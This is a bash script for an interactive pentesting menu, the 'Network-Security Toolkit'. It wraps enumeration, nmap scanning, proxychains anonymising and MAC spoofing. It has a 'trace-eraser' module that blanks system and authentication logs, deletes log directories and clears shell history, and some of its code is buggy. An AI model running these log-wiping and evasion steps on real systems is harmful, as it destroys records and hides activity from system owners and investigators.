#!/usr/bin/env bash 

###############################
# NST by Kartik Iyer (r0d3nt) #
###############################

sleep 1

ANON_CHECK()
{
	if [ -f /usr/share/ntoolkit/.anon_check ]; then
		echo -e "\e[0;34m[+]\e[0m Anonymity status   : \e[0;32mEnabled\e[0m"
	else 
		echo -e "\e[0;31m[-]\e[0m Anonymity status   : \e[0;31mDisabled\e[0m"
	fi
}
 

if ! [ -d /usr/share/ntoolkit/.check ]
then
	echo -e "\e[0;31mRun the setup file first.\e[0m"
else 
CONNECTION_CHECK()
{
	wget -q --tries=10 --timeout=20 --spider http://google.com 2>/dev/null
	if [[ $? -eq 0 ]]; then
	    echo 
	    echo -e "\e[0;34m[+]\e[0m Network connection : \e[0;32mEnabled\e[0m"
	    flag=0
	else
	    echo 
	    echo -e "\e[0;31m[-]\e[0m Network connection : \e[0;31mnot-detected\e[0m"
	    echo -e "\e[0;31m[-]\e[0m NST will now work with some limited functionalities."
	    flag=1

	fi
}

VERSION_DETECT()
{
	VERSION=$(lsb_release -is)
	echo -e "\e[0;32m[+]\e[0m OS detected as : $VERSION\e[0m"
	echo -e "\e[0;32m[+]\e[0m Settings were configured according to your distro."
}

PROT_BANNER()
{
	echo -e "
 _______  ______    _______  _______          _______  __    _  __   __  __   __ 
|       ||    _ |  |       ||       |        |       ||  |  | ||  | |  ||  |_|  |
|    _  ||   | ||  |   _   ||_     _|        |    ___||   |_| ||  | |  ||       |
|   |_| ||   |_||_ |  | |  |  |   |          |   |___ |       ||  |_|  ||       |
|    ___||    __  ||  |_|  |  |   |          |    ___||  _    ||       ||       |
|   |    |   |  | ||       |  |   |   _____  |   |___ | | |   ||       || ||_|| |
|___|    |___|  |_||_______|  |___|  |_____| |_______||_|  |__||_______||_|   |_|

"
}

TRACE_ERASER_BANNER()
{
	echo "
 _______  ______    _______  _______  _______          _______  ______    _______  _______  _______  ______   
|       ||    _ |  |   _   ||       ||       |        |       ||    _ |  |   _   ||       ||       ||    _ |  
|_     _||   | ||  |  |_|  ||       ||    ___|        |    ___||   | ||  |  |_|  ||  _____||   _   ||   | ||  
  |   |  |   |_||_ |       ||       ||   |___         |   |___ |   |_||_ |       || |_____ |  | |  ||   |_||_ 
  |   |  |    __  ||       ||      _||    ___|        |    ___||    __  ||       ||_____  ||  |_|  ||    __  |
  |   |  |   |  | ||   _   ||     |_ |   |___  _____  |   |___ |   |  | ||   _   | _____| ||       ||   |  | |
  |___|  |___|  |_||__| |__||_______||_______||_____| |_______||___|  |_||__| |__||_______||_______||___|  |_|
  
  "
}

PENTESTING_BANNER()
{
	echo -e "
 ______   _______ _______ ___ ______    _______ _______ __    _ _______ _______ _______ _______ ___ __    _ _______ 
|    _ | |   _   |       |   |      |  |       |       |  |  | |       |       |       |       |   |  |  | |       |
|   | || |  |_|  |    _  |   |  _    | |    _  |    ___|   |_| |_     _|    ___|  _____|_     _|   |   |_| |    ___|
|   |_||_|       |   |_| |   | | |   | |   |_| |   |___|       | |   | |   |___| |_____  |   | |   |       |   | __ 
|    __  |       |    ___|   | |_|   | |    ___|    ___|  _    | |   | |    ___|_____  | |   | |   |  _    |   ||  |
|   |  | |   _   |   |   |   |       | |   |   |   |___| | |   | |   | |   |___ _____| | |   | |   | | |   |   |_| |
|___|  |_|__| |__|___|   |___|______|  |___|   |_______|_|  |__| |___| |_______|_______| |___| |___|_|  |__|_______|
	"
}

FIREWALL_BANNER()
{
	echo -e "
 _______  ___   ______    _______  _     _  _______  ___      ___     
|       ||   | |    _ |  |       || | _ | ||   _   ||   |    |   |    
|    ___||   | |   | ||  |    ___|| || || ||  |_|  ||   |    |   |    
|   |___ |   | |   |_||_ |   |___ |       ||       ||   |    |   |    
|    ___||   | |    __  ||    ___||       ||       ||   |___ |   |___ 
|   |    |   | |   |  | ||   |___ |   _   ||   _   ||       ||       |
|___|    |___| |___|  |_||_______||__| |__||__| |__||_______||_______|
	"
}

UNCOVER_BANNER()
{
	echo -e "
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Uncover Incident-Response Framework
     By - Kartik Iyer (@ragedinfosec)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"
}

if ! [ -f $(pwd)/dependencies/.terms ]
then
	clear
	echo -e "[*] TERMS AND CONDITIONS

I shall not use The Network-Security Toolkit to:

a) Upload or otherwise transmit, display or distribute any content that 
infringes any trademark, trade secret, copyright or other proprietary or 
intellectual property rights of any person;

b) Upload or otherwise transmit any material that conatins software viruses
or any other computer code, files or programs designed to interrupt, destroy
or limit the functionality of any computer software or hardware or telecommunications
equipment.

c) If you ever meet the author of the NST by surprise, make sure to greet and offer 
him a drink(or you can say, a soda). Dinner is optional, ofcourse, but he rarely rejects...!

\e[0;31md) This is to note that this toolkit is being developed only for legal purposes and not evil..!
Illegal use of this software without proper prior knowledge could lead to imprisonment of an individual.\e[0m\n\n"



echo -e "\e[0;33mThanks for reading,
Kartik Iyer (r0d3nt), author of NST,
From RagedInfoSec.\e[0m\n"
echo -n -e "\e[0;32m[*] Do you agree to the terms and conditions of NST (Y/n): \e[0m" 
read terms
	# exit 
	if [ $terms != "Y" ]
	then
		echo -e "\e[1;31m[!] You must agree to the terms and conditions before starting NST."
		exit
	else
		touch $(pwd)/dependencies/.terms
		echo "User accepted" > $(pwd)/dependencies/.terms 2>/dev/null
		sleep 1
	fi
	
fi

#catching keyboard interruption
			keyboard_interruptt()
			{
				echo ""
				echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
				# echo ""
				exit 2
			}
			trap "keyboard_interruptt" 2

#checking if user is root
if [ $(whoami) != "root" ]
then
	#catching keyboard interruption
	keyboard_interruptt()
	{
		echo ""
		echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
		# echo ""
		exit 2
	}
	bold=$(tput bold)
	echo 
	echo -e "\e[1;0m======================================================================
\e[0;32m[*]\e[0m The Network-Security Toolkit(v1.0.0) 
\e[0;31m[!] Run this script as root.\e[0m             
======================================================================\e[0m\n" 
	exit 

else

	if [ -f $(pwd)/dependencies/.terms ]
	then
		banner()
			{
			bold=$(tput bold)
			echo -e "\e[0;31m${bold}                                                       
	             .;lxkOOOOxo;.                      
	           0WMMMMMMMMMMMMMNk                    
	          ;WMMMMMMMMMMMMMMMN,                   
	         'dMMMMMMMMMMMMMMMMX;..                 
	         cdMMMMMMMMMMMMMMMMNc,                  
	        .o:MMMMMMMMMMMMMMMMk.'                  
	       ..:.XMMMMMMMMMMMMMMMd:.                  
	       ..''XMMMMMMMMMMMMMMMd,                   
	      .  'KXWMMMMMMMMMMMMMNXKc                  
	         ,   .;lkKWWMKd:'   .;,                 
	      .          .oKN.         c                
	      ..;.. . . ,,.'0Ko:;...'l:l;               
	       . ' . ..',.   :ddN0dll.. .               
	             ...   . .dcc.                      
	           .   'cllo:cdc.   .                   
	               ;doxldoo:  .                     
	            ... c;:lldl'.  .                    
	               ..,,dlo:.                        
	                 'll;.. .                       
	                .. . ..  
	      _______    ____________________
	      \      \  /   _____/\__    ___/
	      /   |   \ \_____  \   |    |   
	     /    |    \/        \  |    |   
	     \____|__  /_______  /  |____|   
	     	     \/        \/           
	                                                  \e[0m "               
			}

		details()
			{
				echo -e "\e[0;34m[***]\e[0m       \e[0;34m The Network-Security Toolkit (\e[0;33mNST\e[0;34m) \e[0m      \e[0;34m[***]\e[0m"
				echo -e "\e[0;34m[***]\e[0m        \e[0;34m Created By: \e[0:31mKartik Iyer\e[0;34m (\e[0;33mn0nam3\e[0;34m) \e[0m       \e[0;34m[***]\e[0m"
				echo -e "\e[0;34m\e[0m       	     \e[0;34m          Version: \e[0;31m1.0.0\e[0m                  \e[0;34m\e[0m"
				echo -e "\e[0;34m[***]\e[0m     \e[0;34m Follow me on Instagram: \e[0;33m@kartikk_iyerr     \e[0;34m[***]\e[0m"
				echo -e "\e[0;34m[***]\e[0m     \e[0;34m    Follow me on Github: \e[0;33mkartikiyer         \e[0;34m[***]\e[0m"
				echo -e "\e[0;32m          Welcome to the Network-Security Toolkit             \e[0m"
				echo -e "\e[0;32m      A tool which can perform tasks of your networking 
		and pentesting  activities         \e[0m"
		       
				echo ""
				echo -e "\e[1;32m    Network-Security Toolkit is a product of RagedInfoSec\e[0m" ${normal}
				echo -e "\e[0;34m           Webpage: https://www.ragedinfosec.in\e[0m\n"
				# details2
			}

		details2()
			{
				echo -e "\e[0;31m        You can always check for new version of NST.
	      Visit my Github page to do so.\e[0m "
			} 

		if [ "$1" == "-s" ]
		then
			if [ $(ls /usr/share/ntoolkit/.check | wc -l) != "22" ]
			then
				echo 
				echo -e "\e[1;0m======================================================================
\e[0;32m[*]\e[0m The Network-Security Toolkit(v1.0.0/2022) 

\e[0;31m[!]\e[0m Some Requirements of The Network-Security Toolkit are missing.
\e[0;31m[!]\e[0m Try running the setup file again to fix this issue.          
======================================================================\n" 
				exit
			else 
			clear
			# CONNECTION_CHECK
			# ANON_CHECK
			banner
			details
			details2 
			echo
			CONNECTION_CHECK
			ANON_CHECK
			echo 

			
			
			networking()
			{
				# clear
				# banner
				# details
				# echo ""
				#catching keyboard interruption
				keyboard_interruptt()
				{
					echo ""
					# echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
					clear 
					banner 
					details 
					echo 
					main
					exit 2
				}
				trap "keyboard_interruptt" 2
				echo "Welcome to the ${bold}Simple Network Troubleshooter.${normal} This will give you some basic automated options 
related to the networking under a linux administered system to carry out your day to day tasks in a 
much easier way."
				echo ""
				echo -e "\e[0;0m Select From The Menu:\e[0m"
				echo ""
				echo "  1) Check ip of our System"
				echo "  2) Traceroute"
				echo "  3) Pinging a Domain"
				echo "  4) View our Neighbour Router"
				echo "  5) Address Resolution Check (ARP)"
				echo "  6) View Networks in our Region (NETDISCOVER)"
				echo "  7) Mask our mac address"
				echo "  8) Mask our ip address"
				echo "  9) To view network statistics"
				echo " 10) Configure a wireless network/bluetooth"
				echo ""
				echo " 99) Back to the main menu"
				# echo ""
				while true
				do
				under=$(tput smul)
				normal=$(tput sgr0)
				echo 
				read -p "${under}nst${normal}:${under}network${normal} > " net_option
				# echo "" 
				if [ $net_option -eq 1 ]
				then
					echo "[*] Here's your ip configuration"
					echo ""
					ip addr show
					echo ""
				elif [ $net_option -eq 2 ]
				then
					read -p "Enter ip: " ip_addr
					echo ""
					echo "[*] Tracerouting..."
					echo ""
					proxychains traceroute -T ip_addr
					echo ""
					echo "DONE!"
					echo ""
				elif [ $net_option -eq 3 ]
				then
					read -p "Enter domain/ip: " ip_addr
					echo ""
					echo "[*] Pinging...sending 5 pkts by default"
					echo ""
					proxychains ping -c 5 $ip_addr
					echo ""
					echo "DONE!"
					echo ""
				elif [ $net_option -eq 4 ]
				then
					echo "[*] Hey neighbour! where are you?"
					echo ""
					proxychains ip neighbour show
					echo ""
				elif [ $net_option -eq 5 ]
				then
					echo "[*] Here's your arp entries"
					echo ""
					proxychains arp -e -v 
					echo ""
				elif [ $net_option -eq 6 ]
				then
					read -p "Specify your interface(eth*/wlan*): " interface
					echo ""
					echo "[*] Finding devices..."
					echo ""
					proxychains netdiscover -i $interface
					echo ""
				elif [ $net_option -eq 7 ]
				then
					if ! dpkg -s macchanger &> /dev/null
					then
						echo -e "\e[0;31m[!] Uh-oh! package 'macchanger' not found.\e[0m"
						echo ""
						read -p "Do you wish to install it(yes/no): " wish
						if [ $wish -eq "yes" ]
						then
							apt-get install macchanger
							echo ""
						elif [ $wish -eq "no" ]
						then
							echo ""
							echo -e "\e[0;31mQUITTING!\e[0m" 
						fi
					fi
					echo "[*] Changing mac address 3 times(recommended)..."
					echo ""
					read -p "Enter your interface name: " interface
					ifconfig $interface down
					macchanger -e $interface
					macchanger -e $interface
					macchanger -e $interface
					ifconfig $interface up
					echo ""
					echo "DONE!"
					echo ""
				elif [ $net_option -eq 8 ]
				then
					read -p "Enter new ip address to be changed: " ip_addr
					echo "[*] Changing ip address..."
					proxychains ifconfig eth0 $ip_addr
					echo ""
					echo "DONE!"
					echo ""
				elif [ $net_option -eq 9 ]
				then
					echo 
					netstat -platune
					echo 
				elif [ $net_option -eq 10 ]
				then
					clear 
					banner 
					details 
					echo 
					echo -e "\e[0;32m[*] Select From The Menu:\e[0m"
					echo ""
					echo "1) Wifi"
					echo "2) Bluetooth"
					echo
					echo "99) Back a menu"
					echo 
					while true 
					do
					read -p "Your choice: " choice 
					echo 
					if [ "$choice" == "1" ]
					then
						clear 
						banner 
						details 
						echo 
						echo -e "\e[0;32m[*] Select From The Menu:\e[0m"
						echo 
						echo "  1) To view our wifi network"
						echo "  2) To make our wireless interface up"
						echo "  3) To make our wireless interface in monitor mode"
						echo "  4) To make our wireless interface down"
						echo "  5) To ping a wifi network"
						echo 
						echo "  99) Back a menu"
						# echo 
						while true
						do
						read -p "Your choice: " choice1
						read -p "Your wireless inerface: " wire_inter
						if [ "$choice1" == "1" ]
						then
							echo 
							proxychains iwconfig $wire_inter
							echo 
						elif [ "$choice1" == "2" ]
						then
							echo 
							proxychains iwconfig $wire_inter up 
							echo "Interface up"
							echo 
						elif [ "$choice1" == "3" ]
						then 
							echo 
							proxychains airmon-ng $wire_inter
							echo "Monitor mode ONN"
							echo 
						elif [ "$choice1" == "4" ]
						then 
							echo 
							proxychains iwconfig $wire_inter down
							echo "Interface down"
							echo 
						elif [ "$choice1" == "5" ]
						then 
							read -p "Enter ip address to ping: " pinging
							echo 
							echo "Pinging..."
							ping -c 10 $pinging
							echo 
						else
							echo -e "\e[0;31m[!] Enter valid option\e[0m"
						fi
						done
					fi
				done

				elif [ $net_option -eq 99 ]
				then
					clear
					banner
					details
					details2
					# echo ""
					# echo ""
					main
				fi
				done 
			}

			Protocol_enum()
			{
				PROT_BANNER
				# clear
				# banner
				# details
				# echo ""
				#catching keyboard interruption
				keyboard_interruptt()
				{
					echo ""
					# echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
					clear 
					banner 
					details 
					echo 
					main
					# echo ""
					exit 2
				}
				trap "keyboard_interruptt" 2
				# echo ""
				echo -e " Select From The Menu:"
				echo ""
				echo "  1) DNS Enumeration"
				echo "  2) SNMP Enumeration"
				echo "  3) Netbios Enumeration"
				echo "  4) SMTP Enumeration"
				echo "  5) SSH Enumeration"
				echo "  6) LOOKUPS"
				echo "  7) TELNET"
				echo ""
				echo " 99) Back to the main menu"
				# echo ""
				while true 
				do
				under=$(tput smul)
				normal=$(tput sgr0)
				echo -e "\e[0;36m"
				read -p "[nst][enum]${normal}> "  prot_enum_option
				echo ""

				if [ $prot_enum_option -eq 99 ]
				then
					clear
					banner
					details
					# details2
					echo ""
					main
				elif [ $prot_enum_option -eq 1 ]
				then
					read -p "Enter ip address to enumerate: " ip_addr
					echo ""
					echo -e "\e[0;32m[*] Command used - dnsenum $ip_addr\e[0m"
					echo ""
					proxychains dnsenum $ip_addr
					echo ""
					echo "DONE!"
					echo ""
				elif [ $prot_enum_option -eq 2 ]
				then
					read -p "Enter ip address to enumerate: " ip_addr
					read -p "Enter port(default 161): " port
					echo ""
					echo -e "\e[0;32m[*] Command used - snmp-check -p $port $ip_addr\e[0m"
					echo ""
					proxychains snmp-check -p $port $ip_addr
					echo ""
					echo "DONE!"
					echo ""
				elif [ $prot_enum_option -eq 3 ]
				then
					read -p "Enter ip address to enumerate: " ip_addr
					echo ""
					echo -e "\e[0;32m[*] Command used - nbtscan $ip_addr -v \e[0m"
					echo ""
					proxychains nbtscan $ip_addr -v
					echo ""
					echo "DONE!"
					echo ""
				elif [ $prot_enum_option -eq 4 ]
				then
					if ! dpkg -s macchanger &> /dev/null
					then
						echo -e "\e[0;31m[!] Uh-oh! package 'macchanger' not found.\e[0m"
						echo ""
						read -p "Do you wish to install it(yes/no): " wish
						echo ""
						if [ "$wish" == "yes" ]
						then
							apt-get install smtp-user-enum
							echo ""
						elif [ "$wish" == "no" ]
					    then
					    	clear
					    	banner
					    	details
					    	echo ""
					    	main
					    else
					    	echo -e "\e[0;31m[!] Enter valid option\e[0m"
					    	echo ""
					    	echo -e "\e[0;31mQUITTING!\e[0m"
					    	exit
					    fi 
					fi
					read -p "Enter ip address to enumerate: " ip_addr
					read -p "Enter mode(VRFY,EXPN,RCPT): " mode
					read -p "Wordlist of users(full path): " wordlist
					echo ""
					echo -e "\e[0;32m[*] Command used - smtp-user-enum -M $mode -U $wordlist -t $ip_addr\e[0m"
					echo ""
					proxychains smtp-user-enum -M $mode -U $wordlist -t $ip_addr
					echo ""
					echo "DONE!"
					echo ""
				elif [ $prot_enum_option -eq 5 ]
				then
					# clear 
					# banner
					# details 
					# echo ""
					echo -e " Select From The Menu:\n"
					echo "  1) Banner grabbing via netcat"
					echo "  2) Banner grabbing via nmap"
					echo "  3) Connect a server directly through SSH"
					echo "  4) Run a command on remote server without actually logging in via ssh"
					echo ""
					echo " 99) Back a menu"
					echo ""
					while true 
					do
					echo -n -e "\e[0;36m[nst][ssh][enum]>\e[0m"
					read choice
					echo ""
					if [ $choice -eq 99 ]
					then
						clear 
						banner 
						details 
						echo 
						Protocol_enum
					elif [ $choice -eq 1 ]
					then
						read -p "Enter ip address: " ip_addr
						echo ""
						echo -e "\e[0;32m[*] Command used - echo "" | nc -v $ip_addr 22 \e[0m"
						echo ""
						echo "" | nc -v $ip_addr 22
						echo ""
						echo "DONE!"
						echo ""
					elif [ $choice -eq 2 ]
					then
						if ! dpkg -s nmap &> /dev/null
						then
							echo -e "\e[0;31m[!] Uh-oh! package 'nmap' not found.\e[0m"
							echo ""
							read -p "Do you wish to install it(yes/no): " nmap_wish
							if [ "$nmap_wish" == "yes" ]
							then
								echo ""
								echo -e "\e[0;32m[!] Installing nmap utility\e[0m"
								echo ""
								apt-get install nmap
								echo ""
							elif [ "$nmap_wish" == "no" ]
							then
								clear
								banner
								details
								echo ""
								main
							else
								echo ""
								echo -e "Invalid option entered.\e[0;31m QUITTING!\e[0m"
							    exit
							fi
						fi

						# while true 
						# do
						clear
						banner
						details 
						echo ""
						echo -e "\e[0;32m[*] Select From The Menu:\e[0m\n"
						echo "  1) SSH-algorithms enumeration"
						echo "  2) SSH-authentication enumeration "
						echo ""
						echo -e "99) Back a menu\n"
						echo -n -e "\e[0;36m[nst][ssh][nmap]>\e[0m"  
						read choice1
						echo ""
						if [ $choice1 -eq 99 ]
						then
							clear 
							banner
							details 
							echo ""
							echo -e " Select From The Menu:\n"
							echo "  1) Banner grabbing via netcat"
							echo "  2) Banner grabbing via nmap"
							echo "  3) Connect via SSH"
							echo ""
							echo " 99) Back a menu"
							echo ""
						elif [ $choice1 -eq 1 ]
						then
							echo ""
							read -p "Enter target ip: " target_ip
							echo ""
							echo -e "\e[0;32m[*] Command used - nmap --script ssh2-enum-algos $target_ip\e[0m"
							echo ""
							proxychains nmap --script ssh2-enum-algos $target_ip
							echo ""
							echo "DONE!"
							echo ""
						elif [ $choice1 -eq 2 ]
						then
							echo ""
							read -p "Enter target ip: " target_ip
							read -p "Enter the username to enumerate: " username
							echo ""
							echo -e "\e[0;32m[*] Command used - nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=$username" $target_ip"
							echo ""
							proxychains nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=$username" $target_ip
							echo ""
							echo "DONE!"
							echo ""
						elif [ $choice1 -eq 3 ]
						then
							echo ""
							read -p "Enter target ip: " target_ip
							read -p "Specify a username to connect to: " user_connect
							read -p "Do you have an identity to connect(yes/no): " identity
							echo ""
							if [ "$identity" == "yes" ]
							then
								read -p "Supply identity file(full path): " identity_path
								echo ""
								echo -e "\e[0;32m[*] Command used - ssh -i $identity_path $user_connect@$target_ip\e[0m"
								echo ""
								proxychains ssh -i $identity_path $user_connect@$target_ip
								echo ""
								echo "DONE!"
								echo ""
							elif [ "$identity" == "no" ]
							then
								echo -e "\e[0;32m[*] Command used - ssh $user_connect@$target_ip\e[0m"
								echo ""
								proxychains ssh $user_connect@$target_ip
								echo ""
								echo "DONE!"
								echo ""
							else
								echo -e "[!] Invalid option entered. \e[0;31mQUITTING!\e[0m"
								exit
							fi
						else
							echo -e "[!] Invalid option entered. \e[0;31mQUITTING!\e[0m"
							exit
						fi
					elif [ $choice -eq 3 ]	
					then
						read -p "Enter the username to connect to: " username
						read -p "Enter the ip address to connect to: " ssh_connect
						while true
						do
						read -p "Do you wish to provide an identity to connect? [y/N]: " ssh_choice
						if [ "$ssh_choice" == "y" ]
						then
							read -p "Provide us with that identity(specify full path): " identity
							proxychains ssh -i $identity $username@$ssh_connect
							echo  
							break
						elif [ "$ssh_choice" == "N" ]
						then
							proxychains ssh $username@$ssh_connect 
							echo 
							break
						else
							echo -e "\e[0;31m[!] Enter valid option\e[0m"
						fi
						done
					fi
					done
				elif [ $prot_enum_option -eq 6 ]
				then
					read -p "Enter ip addr/domain: " ip_addr
					echo ""
					echo -e "\e[0;32m[*] Command used - dig $ip_addr\e[0m"
					echo ""
					proxychains dig $ip_addr
					echo ""
					echo "DONE!"
						
				fi
				done
			}

			port_scanner()
			{
				# clear
				# banner
				# details
				# echo ""
				# echo ""
				#catching keyboard interruption
				keyboard_interruptt()
				{
					echo ""
					# echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
					clear 
					banner 
					details 
					echo 
					main
					# echo ""
					exit 2
				}
				trap "keyboard_interruptt" 2

				#checking if nmap is installed 
				

				echo -e "\e[0;33m[!] We will be using Nmap for this action. NMAP(Network Mapper) 
	    is a tool used for network discovery, security auditing and 
	             to discover open ports on target host.\e[0m"
				echo ""
				while true 
				do
				read -p "[*] Enter domain/ip address to scan: " domain
				read -p "[*] Specify a port or range of ports(ex: 1-40): " port
				echo ""
				echo "Choose the Scan Type:"
				echo ""
				echo "  1) Service Scan(-sV): To list various services on target host"
				echo "  2) Operating System Determination Scan(-O)"
				echo "  3) Syn Scan: To evade firewall detection(-sS)"
				echo "  4) Aggressive Scan(-A)"
				echo "  5) TCP scan: for wireless networks(-sT)"
				echo "  6) UDP scan: for wired networks(-sU)"
				echo "  7) Ping Scan(-sn)"
				echo "  8) Treat all hosts online(-Pn)"
				echo "  9) Use default script to scan(-sC)"
				echo ""
				echo "  99) Back to the main menu"
				# echo "10) Manually specify a script to scan(--script)"
				echo ""
				read -p "[*] How many options you want to use(max 4): " scan_options_number

			# while true
			# do

				if [ $scan_options_number -eq 1 ]
				then
					read -p "[*] Enter your options from the menu(Bracketed options seperated by space): " scan_option1
					echo ""
					echo -e "\e[0;32m[*] Command used - nmap $scan_option1 $domain -p $port -v \e[0m"
					echo ""
					nmap $scan_option1 $domain -p $port -v 

				elif [ $scan_options_number -eq 2 ]
				then
					read -p "[*] Enter your options from the menu(Bracketed options seperated by space): " scan_option1 scan_option2
					echo ""
					echo -e "\e[0;32m[*] Command used - nmap $scan_option1 $scan_option2 $domain -p $port -v \e[0m"
					echo ""
					nmap $scan_option1 $scan_option2 $domain -p $port  -v 

				elif [ $scan_options_number -eq 3 ]
				then
					read -p "[*] Enter your options from the menu(Bracketed options seperated by space): " scan_option1 scan_option2 scan_option3
					echo ""
					echo -e "\e[0;32m[*] Command used - nmap $scan_option1 $scan_option2 $scan_option3 $domain -p $port -v \e[0m"
					echo ""
					nmap $scan_option1 $scan_option2 $scan_option3 $domain -p $port -v 

				elif [ $scan_options_number -eq 4 ]
				then
					read -p "[*] Enter your options from the menu(Bracketed options seperated by space): " scan_option1 scan_option2 scan_option3 scan_option4
					echo ""
					echo -e "\e[0;32m[*] Command used - nmap $scan_option1 $scan_option2 $scan_option3 $scan_option4 $domain -p $port -v \e[0m"
					echo ""
					nmap $scan_option1 $scan_option2 $scan_option3 $scan_option4 $domain -p $port -v
					
				elif [ $scan_options_number -le 6 ]
				then
					echo ""
					echo -e "\e[0;31m[!] Choose 4 options for better performance!\e[0m"

				elif [ $scan_options_number -eq 99 ]
				then
					clear 
					banner
					details 
					echo ""
					main
				else
					echo ""
					echo -e "\e[0;31m[!] Enter valid number\e[0m"
				fi
				done
			# done
			}

			clear_logs()
			{
				TRACE_ERASER_BANNER
				# clear
				# banner
				# details
				# echo ""
				#catching keyboard interruption
				keyboard_interruptt()
				{
					echo ""
					# echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
					clear 
					banner 
					details 
					echo 
					main
					# echo ""
					exit 2
				}
				# echo ""
				echo -e " Select From The Menu:"
				echo ""
				echo "  1) Clear logs"
				echo "  2) Clear history"
				echo "  3) Clear logs & history"
				echo ""
				echo " 99) Back to the main menu"
				echo ""
				while true 
				do
				under=$(tput smul)
				normal=$(tput sgr0)
				echo -e "\e[0;36m"
				read -p "[nst][trace-eraser]${normal}> " log_option
				if [ $log_option -eq 99 ]
				then
					clear
					banner
					details
					echo ""
					main
				elif [ $log_option -eq 1 ]
				then
					echo ""
					LOGS_FILES=(
	        		/var/log/messages             # General message and system related stuff
	        		/var/log/auth.log             # Authenication logs
	        		/var/log/kern.log             # Kernel logs
	        		/var/log/cron.log             # Crond logs
	        		/var/log/maillog              # Mail server logs
	        		/var/log/boot.log             # System boot log
	        		/var/log/mysqld.log           # MySQL database server log file
	        		/var/log/qmail                # Qmail log directory
	        		/var/log/httpd                # Apache access and error logs directory
	        		/var/log/lighttpd             # Lighttpd access and error logs directory
	        		/var/log/secure               # Authentication log
	        		/var/log/utmp                 # Login records file
	        		/var/log/wtmp                 # Login records file
	        		/var/log/yum.log              # Yum command log file
	        		/var/log/system.log           # System Log
	        		/var/log/DiagnosticMessages   # Mac Analytics Data
	        		/Library/Logs                 # System Application Logs
	        		/Library/Logs/DiagnosticReports # System Reports
	        		~/Library/Logs                # User Application Logs
	        		~/Library/Logs/DiagnosticReports # User Reports
	        		)
	        		for i in "${LOGS_FILES[@]}"
	        		do
	                	if [ -f "$i" ]; then
	                        if [ -w "$i" ]; then
	                            echo "" > "$i"
	                            echo -e "\e[0;33m[+]\e[0m cleaned $i."
	                        else
	                            echo -e "\e[0;31m[!]\e[0m $i doesn't contain 'write' privileges"
	                        fi
	                	elif [ -d "$i" ]; then
	                        if [ -w "$i" ]; then
	                            rm -rf "${i:?}"/*
	                            echo -e "\e[0;33m[+]\e[0m  cleaned $i."
	                        else
	                         	echo -e "\e[0;31m[!]\e[0m $i doesn't contain 'write' privileges."
	                        fi
	                	fi
	        		done
	        	elif [ $log_option -eq 2 ]
	        	then
	        		echo 
	        		if [ -f ~/.zsh_history ]; then
	                	echo "" > ~/.zsh_history
	                	echo -e "\e[0;33m[+]\e[0m ~/.zsh_history cleaned."
	        		fi

	        		echo "" > ~/.bash_history
	        		echo -e "\e[0;33m[+]\e[0m ~/.bash_history cleaned."

	        		history -c
	        		echo -e "\e[0;33m[+]\e[0m History file deleted."

	        		echo
	        		echo -e "\e[0;32m[*]\e[0m Actions can be seen after reloading this session."
	        	elif [ $log_option -eq 3 ]
	        	then
	        		echo ""
					LOGS_FILES=(
	        		/var/log/messages             # General message and system related stuff
	        		/var/log/auth.log             # Authenication logs
	        		/var/log/kern.log             # Kernel logs
	        		/var/log/cron.log             # Crond logs
	        		/var/log/maillog              # Mail server logs
	        		/var/log/boot.log             # System boot log
	        		/var/log/mysqld.log           # MySQL database server log file
	        		/var/log/qmail                # Qmail log directory
	        		/var/log/httpd                # Apache access and error logs directory
	        		/var/log/lighttpd             # Lighttpd access and error logs directory
	        		/var/log/secure               # Authentication log
	        		/var/log/utmp                 # Login records file
	        		/var/log/wtmp                 # Login records file
	        		/var/log/yum.log              # Yum command log file
	        		/var/log/system.log           # System Log
	        		/var/log/DiagnosticMessages   # Mac Analytics Data
	        		/Library/Logs                 # System Application Logs
	        		/Library/Logs/DiagnosticReports # System Reports
	        		~/Library/Logs                # User Application Logs
	        		~/Library/Logs/DiagnosticReports # User Reports
	        		)
	        		echo -e "\e[0;31m[*]\e[0m Clearing logs..\n"
	        		for i in "${LOGS_FILES[@]}"
	        		do
	                	if [ -f "$i" ]; then
	                        if [ -w "$i" ]; then
	                            echo "" > "$i"
	                            echo -e "\e[0;33m[+]\e[0m cleaned $i."
	                        else
	                            echo -e "\e[0;31m[!]\e[0m $i doesn't contain 'write' privileges"
	                        fi
	                	elif [ -d "$i" ]; then
	                        if [ -w "$i" ]; then
	                            rm -rf "${i:?}"/*
	                            echo -e "\e[0;33m[+]\e[0m  cleaned $i."
	                        else
	                         	echo -e "\e[0;31m[!]\e[0m $i doesn't contain 'write' privileges."
	                        fi
	                	fi
	        		done
	        		echo 
	        		echo -e "\e[0;31m[*]\e[0m Clearing history..\n"
	        		# echo 
	        		if [ -f ~/.zsh_history ]; then
	                	echo "" > ~/.zsh_history
	                	echo -e "\e[0;33m[+]\e[0m ~/.zsh_history cleaned."
	        		fi

	        		echo "" > ~/.bash_history
	        		echo -e "\e[0;33m[+]\e[0m ~/.bash_history cleaned."

	        		history -c
	        		echo -e "\e[0;33m[+]\e[0m History file deleted."

	        		echo
	        		echo -e "\e[0;32m[*]\e[0m Actions can be seen after reloading this session."

				fi
				done
			}

			firewall()
			{
				FIREWALL_BANNER
				# clear
				# banner
				# details
				echo ""
				# echo ""
				#catching keyboard interruption
				keyboard_interruptt()
				{
					echo ""
					# echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
					clear 
					banner 
					details 
					echo 
					main
					# echo ""
					exit 2
				}
				trap "keyboard_interruptt" 2
				echo -e "We will be using 'Iptables' for this action. Iptables is a user-space firewall for Linux. 
It filters out the connection based on user-defined rules"
				echo ""
				echo -e " Select From The Menu:"
				echo ""
				echo "  1) To view the rules specified in the Firewall"
				echo "  2) To configure the Firewall"
				echo "  3) Intrusion Detection System"
				echo ""
				echo " 99) Back to the main menu"
				echo ""
				while true 
				do
				under=$(tput smul)
				normal=$(tput sgr0)
				echo -e "\e[0;36m"
				read -p "[nst][firewall]${normal}> " firewall_option
				echo ""
